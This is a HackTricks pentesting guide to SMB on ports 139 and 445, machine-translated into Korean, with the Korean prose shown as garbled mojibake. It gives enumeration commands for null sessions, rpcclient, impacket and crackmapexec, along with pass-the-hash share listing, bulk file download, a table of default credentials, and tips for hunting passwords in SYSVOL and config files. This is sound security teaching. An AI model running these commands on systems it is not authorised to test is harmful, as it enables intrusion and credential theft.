# 139,445 - SMB Pentesting

<details>

<summary><strong>AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks êµ¿ì¦ˆ**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ê¸°ì—¬í•˜ì„¸ìš”.

</details>

## **í¬íŠ¸ 139**

_**ë„¤íŠ¸ì›Œí¬ ê¸°ë³¸ ì…ë ¥ ì¶œë ¥ ì‹œìŠ¤í…œ**_** (NetBIOS)**ëŠ” ë¡œì»¬ ì˜ì—­ ë„¤íŠ¸ì›Œí¬(LAN) ë‚´ì˜ ì‘ìš© í”„ë¡œê·¸ë¨, PC ë° ë°ìŠ¤í¬í†±ì´ ë„¤íŠ¸ì›Œí¬ í•˜ë“œì›¨ì–´ì™€ ìƒí˜¸ ì‘ìš©í•˜ê³  **ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ë°ì´í„°ë¥¼ ì „ì†¡í•˜ëŠ” ê²ƒì„ ìš©ì´í•˜ê²Œ í•˜ëŠ”** ì†Œí”„íŠ¸ì›¨ì–´ í”„ë¡œí† ì½œì…ë‹ˆë‹¤. NetBIOS ë„¤íŠ¸ì›Œí¬ì—ì„œ ì‘ë™í•˜ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ì‹ë³„ ë° ìœ„ì¹˜ëŠ” ìµœëŒ€ 16ìê¹Œì§€ì˜ NetBIOS ì´ë¦„ì„ í†µí•´ ë‹¬ì„±ë˜ë©° ì»´í“¨í„° ì´ë¦„ê³¼ ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ë¦…ë‹ˆë‹¤. ë‘ ì‘ìš© í”„ë¡œê·¸ë¨ ê°„ì˜ NetBIOS ì„¸ì…˜ì€ í´ë¼ì´ì–¸íŠ¸ë¡œ ì‘ë™í•˜ëŠ” í•œ ì‘ìš© í”„ë¡œê·¸ë¨ì´ ë‹¤ë¥¸ ì„œë²„ë¡œ ì‘ë™í•˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì„ "í˜¸ì¶œ"í•˜ëŠ” ëª…ë ¹ì„ ë‚´ë¦´ ë•Œ **TCP í¬íŠ¸ 139**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œì‘ë©ë‹ˆë‹¤.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## í¬íŠ¸ 445

ê¸°ìˆ ì ìœ¼ë¡œ í¬íŠ¸ 139ëŠ” 'NBT over IP'ë¡œ ì§€ì¹­ë˜ë©°, í¬íŠ¸ 445ëŠ” 'SMB over IP'ë¡œ ì‹ë³„ë©ë‹ˆë‹¤. ì•½ì–´ **SMB**ëŠ” '**Server Message Blocks**'ì˜ ì•½ì–´ë¡œ, í˜„ëŒ€ì ìœ¼ë¡œëŠ” **Common Internet File System (CIFS)**ë¡œë„ ì•Œë ¤ì ¸ ìˆìŠµë‹ˆë‹¤. ì‘ìš© ê³„ì¸µ ë„¤íŠ¸ì›Œí¬ í”„ë¡œí† ì½œì¸ SMB/CIFSëŠ” ì£¼ë¡œ íŒŒì¼, í”„ë¦°í„°, ì‹œë¦¬ì–¼ í¬íŠ¸ì— ëŒ€í•œ ê³µìœ  ì•¡ì„¸ìŠ¤ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•˜ê³  ë„¤íŠ¸ì›Œí¬ ìƒì˜ ë…¸ë“œ ê°„ ë‹¤ì–‘í•œ í˜•íƒœì˜ í†µì‹ ì„ ìš©ì´í•˜ê²Œ í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, Windowsì˜ ê²½ìš°, SMBëŠ” TCP/IP ìƒì—ì„œ ì§ì ‘ ì‘ë™í•  ìˆ˜ ìˆìœ¼ë©°, NetBIOS over TCP/IPê°€ í•„ìš”í•˜ì§€ ì•Šë„ë¡ í¬íŠ¸ 445ë¥¼ í™œìš©í•©ë‹ˆë‹¤. ë°˜ë©´, ë‹¤ë¥¸ ì‹œìŠ¤í…œì—ì„œëŠ” í¬íŠ¸ 139ì˜ ì‚¬ìš©ì´ ê´€ì°°ë˜ë©°, ì´ëŠ” SMBê°€ NetBIOS over TCP/IPì™€ í•¨ê»˜ ì‹¤í–‰ë˜ê³  ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

**ì„œë²„ ë©”ì‹œì§€ ë¸”ë¡ (SMB)** í”„ë¡œí† ì½œì€ **í´ë¼ì´ì–¸íŠ¸-ì„œë²„** ëª¨ë¸ì—ì„œ ì‘ë™í•˜ë©° **íŒŒì¼, ë””ë ‰í† ë¦¬ ë° í”„ë¦°í„°, ë¼ìš°í„°ì™€ ê°™ì€ ë„¤íŠ¸ì›Œí¬ ìì›ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤**ë¥¼ ì¡°ì ˆí•˜ê¸° ìœ„í•´ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. ì£¼ë¡œ **Windows** ìš´ì˜ ì²´ì œ ì‹œë¦¬ì¦ˆ ë‚´ì—ì„œ ì‚¬ìš©ë˜ë©°, SMBëŠ” Microsoftì˜ ìµœì‹  ìš´ì˜ ì²´ì œë¥¼ ì‹¤í–‰í•˜ëŠ” ì¥ì¹˜ê°€ ì´ì „ ë²„ì „ì„ ì‹¤í–‰í•˜ëŠ” ì¥ì¹˜ì™€ ì›í™œí•˜ê²Œ ìƒí˜¸ ì‘ìš©í•  ìˆ˜ ìˆë„ë¡ ì—­ í˜¸í™˜ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤. ë˜í•œ **Samba** í”„ë¡œì íŠ¸ëŠ” ë¬´ë£Œ ì†Œí”„íŠ¸ì›¨ì–´ ì†”ë£¨ì…˜ì„ ì œê³µí•˜ì—¬ SMBë¥¼ **Linux** ë° Unix ì‹œìŠ¤í…œì— êµ¬í˜„í•  ìˆ˜ ìˆë„ë¡ í•˜ì—¬ SMBë¥¼ í†µí•œ í¬ë¡œìŠ¤ í”Œë«í¼ í†µì‹ ì„ ìš©ì´í•˜ê²Œ í•©ë‹ˆë‹¤.

**ì„ì˜ì˜ ë¡œì»¬ íŒŒì¼ ì‹œìŠ¤í…œ ë¶€ë¶„**ì„ ë‚˜íƒ€ë‚´ëŠ” ê³µìœ ëŠ” SMB ì„œë²„ì—ì„œ ì œê³µë  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ í´ë¼ì´ì–¸íŠ¸ê°€ ì„œë²„ì˜ ì‹¤ì œ êµ¬ì¡°ì™€ **ë¶€ë¶„ì ìœ¼ë¡œ ë…ë¦½ì ì¸** ê³„ì¸µ êµ¬ì¡°ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì•¡ì„¸ìŠ¤ ì œì–´ ëª©ë¡ (ACL)**ì€ **ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ì •ì˜**í•˜ë©°, **`ì‹¤í–‰`**, **`ì½ê¸°`**, **`ì „ì²´ ì•¡ì„¸ìŠ¤`**ì™€ ê°™ì€ ì†ì„±ì„ í¬í•¨í•˜ì—¬ ì‚¬ìš©ì ê¶Œí•œì— ëŒ€í•œ **ì„¸ë°€í•œ ì œì–´**ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê¶Œí•œì€ ê³µìœ ì— ê¸°ë°˜í•˜ì—¬ ê°œë³„ ì‚¬ìš©ì ë˜ëŠ” ê·¸ë£¹ì— í• ë‹¹ë  ìˆ˜ ìˆìœ¼ë©°, ì„œë²„ì— ì„¤ì •ëœ ë¡œì»¬ ê¶Œí•œê³¼ êµ¬ë¶„ë©ë‹ˆë‹¤.

### IPC$ ê³µìœ 

IPC$ ê³µìœ ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ëŠ” ìµëª… ë„ ì„¸ì…˜ì„ í†µí•´ ì–»ì„ ìˆ˜ ìˆìœ¼ë©°, ì´ë¦„ ìˆëŠ” íŒŒì´í”„ë¥¼ í†µí•´ ë…¸ì¶œëœ ì„œë¹„ìŠ¤ì™€ ìƒí˜¸ ì‘ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `enum4linux` ìœ í‹¸ë¦¬í‹°ëŠ” ì´ëŸ¬í•œ ëª©ì ì— ìœ ìš©í•©ë‹ˆë‹¤. ì˜¬ë°”ë¥´ê²Œ í™œìš©í•˜ë©´ ë‹¤ìŒì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ìš´ì˜ ì²´ì œì— ëŒ€í•œ ì •ë³´
* ìƒìœ„ ë„ë©”ì¸ì— ëŒ€í•œ ì„¸ë¶€ ì •ë³´
* ë¡œì»¬ ì‚¬ìš©ì ë° ê·¸ë£¹ì˜ ì»´íŒŒì¼
* ì‚¬ìš© ê°€ëŠ¥í•œ SMB ê³µìœ ì— ëŒ€í•œ ì •ë³´
* íš¨ê³¼ì ì¸ ì‹œìŠ¤í…œ ë³´ì•ˆ ì •ì±…

ì´ ê¸°ëŠ¥ì€ ë„¤íŠ¸ì›Œí¬ ê´€ë¦¬ìì™€ ë³´ì•ˆ ì „ë¬¸ê°€ê°€ ë„¤íŠ¸ì›Œí¬ ìƒì˜ SMB (ì„œë²„ ë©”ì‹œì§€ ë¸”ë¡) ì„œë¹„ìŠ¤ì˜ ë³´ì•ˆ í¬ì§€ì…˜ì„ í‰ê°€í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤. `enum4linux`ëŠ” ëŒ€ìƒ ì‹œìŠ¤í…œì˜ SMB í™˜ê²½ì— ëŒ€í•œ í¬ê´„ì ì¸ ì •ë³´ë¥¼ ì œê³µí•˜ì—¬ ì ì¬ì ì¸ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  SMB ì„œë¹„ìŠ¤ê°€ ì ì ˆí•˜ê²Œ ë³´í˜¸ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ë° í•„ìˆ˜ì ì…ë‹ˆë‹¤.
```bash
enum4linux -a target_ip
```
ìœ„ì˜ ëª…ë ¹ì–´ëŠ” `enum4linux`ê°€ `target_ip`ë¡œ ì§€ì •ëœ ëŒ€ìƒì— ëŒ€í•´ ì™„ì „í•œ ì—´ê±°ë¥¼ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì˜ ì˜ˆì…ë‹ˆë‹¤.

## NTLMì´ë€

NTLMì´ ë¬´ì—‡ì¸ì§€ ëª¨ë¥´ê±°ë‚˜ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë° ì–´ë–»ê²Œ ì•…ìš©í•  ìˆ˜ ìˆëŠ”ì§€ ì•Œê³  ì‹¶ë‹¤ë©´, **NTLM**ì— ê´€í•œ ì´ í˜ì´ì§€ë¥¼ ë§¤ìš° í¥ë¯¸ë¡­ê²Œ ì°¾ì„ ê²ƒì…ë‹ˆë‹¤. ì—¬ê¸°ì—ì„œëŠ” **ì´ í”„ë¡œí† ì½œì´ ì–´ë–»ê²Œ ì‘ë™í•˜ë©° ì–´ë–»ê²Œ ê·¸ê²ƒì„ ì•…ìš©í•  ìˆ˜ ìˆëŠ”ì§€ì— ëŒ€í•´ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤:**

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **ì„œë²„ ì—´ê±°**

### **ìŠ¤ìº”**ì„ í†µí•´ í˜¸ìŠ¤íŠ¸ë¥¼ ê²€ìƒ‰í•˜ëŠ” ë„¤íŠ¸ì›Œí¬:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB ì„œë²„ ë²„ì „

SMB ë²„ì „ì— ëŒ€í•œ ê°€ëŠ¥í•œ ì·¨ì•½ì ì„ ì°¾ìœ¼ë ¤ë©´ ì‚¬ìš© ì¤‘ì¸ ë²„ì „ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ë‹¤ë¥¸ ì‚¬ìš©ëœ ë„êµ¬ì—ì„œ ì´ ì •ë³´ê°€ ë‚˜íƒ€ë‚˜ì§€ ì•ŠëŠ” ê²½ìš° ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **MSF** ë³´ì¡° ëª¨ë“ˆ \_**auxiliary/scanner/smb/smb\_version**ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.
* ë˜ëŠ” ì´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **ì•…ìš© ê²€ìƒ‰**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **ê°€ëŠ¥í•œ** ìê²© ì¦ëª…

| **ì‚¬ìš©ì ì´ë¦„**      | **ì¼ë°˜ì ì¸ ì•”í˜¸**                      |
| -------------------- | ----------------------------------------- |
| _(ê³µë°±)_            | _(ê³µë°±)_                                 |
| guest                | _(ê³µë°±)_                                 |
| Administrator, admin | _(ê³µë°±)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | password, test, lab, demo                 |

### ë¸Œë£¨íŠ¸ í¬ìŠ¤

* [**SMB ë¸Œë£¨íŠ¸ í¬ìŠ¤**](../generic-methodologies-and-resources/brute-force.md#smb)

### SMB í™˜ê²½ ì •ë³´

### ì •ë³´ íšë“
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### ì‚¬ìš©ì, ê·¸ë£¹ ë° ë¡œê·¸ì¸ëœ ì‚¬ìš©ì ì—´ê±°

ì´ ì •ë³´ëŠ” ì´ë¯¸ enum4linux ë° enum4linux-ngì—ì„œ ìˆ˜ì§‘ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### ë¡œì»¬ ì‚¬ìš©ì ì—´ê±°

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
í•œ ì¤„ ìš”ì•½
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - ë¡œì»¬ ì‚¬ìš©ì ì—´ê±°
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **LSARPC ë° SAMR rpcclient ì—´ê±°**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### Linuxì—ì„œ GUI ì—°ê²°

#### í„°ë¯¸ë„ì—ì„œ:

`xdg-open smb://cascade.htb/`

#### íŒŒì¼ ë¸Œë¼ìš°ì € ì°½ì—ì„œ (nautilus, thunar ë“±)

`smb://friendzone.htb/general/`

## ê³µìœ  í´ë” ì—´ê±°

### ê³µìœ  í´ë” ëª©ë¡

ì–¸ì œë‚˜ ë¬´ì–¸ê°€ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ìê²© ì¦ëª…ì´ ì—†ëŠ” ê²½ìš° **null ìê²© ì¦ëª…/ê²ŒìŠ¤íŠ¸ ì‚¬ìš©ì**ë¥¼ ì‚¬ìš©í•´ ë³´ì‹­ì‹œì˜¤.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **ê³µìœ  í´ë” ì—°ê²°/ëª©ë¡**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **Windows ê³µìœ ë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì—´ê±°í•˜ê³  ì—°ê²°í•˜ê¸°**

í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ì˜ ê³µìœ ë¥¼ í‘œì‹œí•˜ëŠ” ê²ƒì´ ì œí•œë  ìˆ˜ ìˆìœ¼ë©°, ê³µìœ  ëª©ë¡ì„ í‘œì‹œí•˜ë ¤ê³  ì‹œë„í•˜ë©´ ì—°ê²°í•  ìˆ˜ ìˆëŠ” ê³µìœ ê°€ ì—†ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê³µìœ ì— ìˆ˜ë™ìœ¼ë¡œ ì—°ê²°í•´ ë³´ëŠ” ê²ƒì´ ì¢‹ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µìœ ë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì—´ê±°í•˜ë ¤ë©´ ìœ íš¨í•œ ì„¸ì…˜(ì˜ˆ: ë„ ì„¸ì…˜ ë˜ëŠ” ìœ íš¨ ìê²© ì¦ëª…)ì„ ì‚¬ìš©í•  ë•Œ NT\_STATUS\_ACCESS\_DENIED ë° NT\_STATUS\_BAD\_NETWORK\_NAMEê³¼ ê°™ì€ ì‘ë‹µì„ ì°¾ì•„ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì‘ë‹µì€ ê³µìœ ê°€ ì¡´ì¬í•˜ê³  ì•¡ì„¸ìŠ¤í•  ìˆ˜ ì—†ëŠ” ê²½ìš° ë˜ëŠ” ê³µìœ ê°€ ì „í˜€ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš°ë¥¼ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Windows ëŒ€ìƒì˜ ì¼ë°˜ì ì¸ ê³µìœ  ì´ë¦„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(_**Network Security Assessment 3rd edition**_ì—ì„œ ê°€ì ¸ì˜¨ ì¼ë°˜ì ì¸ ê³µìœ  ì´ë¦„)

ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ì´ëŸ¬í•œ ê³µìœ ì— ì—°ê²°ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
ë˜ëŠ” ì´ ìŠ¤í¬ë¦½íŠ¸(ë„ ì„¸ì…˜ ì‚¬ìš©)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
ì˜ˆì‹œ
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Windowsì—ì„œ ì‰ì–´ ëª©ë¡ ì—´ê±°í•˜ê¸° / ì„œë“œíŒŒí‹° ë„êµ¬ ì—†ì´**

PowerShell
```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMD ì½˜ì†”
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC ìŠ¤ëƒ…ì¸ (ê·¸ë˜í”½)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (ê·¸ë˜í”½), ì‚¬ìš© ê°€ëŠ¥í•œ ìˆ¨ê²¨ì§€ì§€ ì•Šì€ ê³µìœ ë¥¼ ë³´ë ¤ë©´ `\\<ip>\`ë¥¼ ì…ë ¥í•˜ì‹­ì‹œì˜¤.

### ê³µìœ  í´ë” ë§ˆìš´íŠ¸
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **íŒŒì¼ ë‹¤ìš´ë¡œë“œ**

ìê²© ì¦ëª…/íŒ¨ìŠ¤ ë” í•´ì‹œë¥¼ ì‚¬ìš©í•˜ì—¬ ì—°ê²°í•˜ëŠ” ë°©ë²•ì„ ë°°ìš°ë ¤ë©´ ì´ì „ ì„¹ì…˜ì„ ì½ìœ¼ì‹­ì‹œì˜¤.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
### ë„ë©”ì¸ ê³µìœ  í´ë” ê²€ìƒ‰

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*

ëª…ë ¹ì–´:

* mask: ë””ë ‰í† ë¦¬ ë‚´ì˜ íŒŒì¼ì„ í•„í„°ë§í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë§ˆìŠ¤í¬ë¥¼ ì§€ì •í•©ë‹ˆë‹¤ (ì˜ˆ: "" ëª¨ë“  íŒŒì¼ì— ëŒ€í•´)
* recurse: ì¬ê·€ë¥¼ í† ê¸€í•©ë‹ˆë‹¤ (ê¸°ë³¸ê°’: ë”)
* prompt: íŒŒì¼ ì´ë¦„ì— ëŒ€í•œ í”„ë¡¬í”„íŠ¸ë¥¼ í† ê¸€í•©ë‹ˆë‹¤ (ê¸°ë³¸ê°’: ì¼¬)
* mget: í˜¸ìŠ¤íŠ¸ì—ì„œ í´ë¼ì´ì–¸íŠ¸ ë¨¸ì‹ ìœ¼ë¡œ ë§ˆìŠ¤í¬ì™€ ì¼ì¹˜í•˜ëŠ” ëª¨ë“  íŒŒì¼ì„ ë³µì‚¬í•©ë‹ˆë‹¤

(_smbclientì˜ manpageì—ì„œì˜ ì •ë³´_)
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) ìŠ¤íŒŒì´ë”.
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
íŠ¹íˆ ì£¼ëª©í•  ë§Œí•œ ê²ƒì€ **`Registry.xml`**ì´ë¼ëŠ” íŒŒì¼ë“¤ì¸ë°, ì´ íŒŒì¼ë“¤ì€ **ê·¸ë£¹ ì •ì±…ì„ í†µí•´ ìë™ ë¡œê·¸ì˜¨ì´ êµ¬ì„±ëœ ì‚¬ìš©ìë“¤ì˜ ì•”í˜¸**ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜ëŠ” **`web.config`** íŒŒì¼ë“¤ì¸ë°, ì´ íŒŒì¼ë“¤ì€ ìê²© ì¦ëª…ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="info" %}
**SYSVOL ê³µìœ **ëŠ” ë„ë©”ì¸ì˜ ëª¨ë“  ì¸ì¦ëœ ì‚¬ìš©ìê°€ **ì½ì„ ìˆ˜ ìˆëŠ”** ê³µìœ ì…ë‹ˆë‹¤. ì—¬ê¸°ì—ëŠ” ë‹¤ì–‘í•œ ë°°ì¹˜, VBScript ë° PowerShell **ìŠ¤í¬ë¦½íŠ¸**ê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‚´ë¶€ì˜ **ìŠ¤í¬ë¦½íŠ¸**ë¥¼ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ê³³ì—ì„œ **ì•”í˜¸**ì™€ ê°™ì€ ë¯¼ê°í•œ ì •ë³´ë¥¼ **ì°¾ì„ ìˆ˜** ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

